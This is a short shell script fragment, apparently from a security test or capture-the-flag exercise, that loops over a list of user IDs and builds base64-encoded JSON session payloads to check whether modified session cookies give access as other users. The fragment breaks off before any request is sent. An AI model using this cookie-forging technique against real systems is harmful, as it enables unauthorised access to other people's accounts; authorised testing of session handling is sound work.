echo "=== Testing modified session cookies with different user_ids ==="
echo ""

# Test a range of user IDs
for user_id in 10031 10030 10033 10034 10035 1 2 100 1000; do
  echo "Testing user_id=$user_id:"
  
  # Create new session payload
  new_payload=$(echo -n "{\"user_id\":$user_id}" | base64 -w0)
  
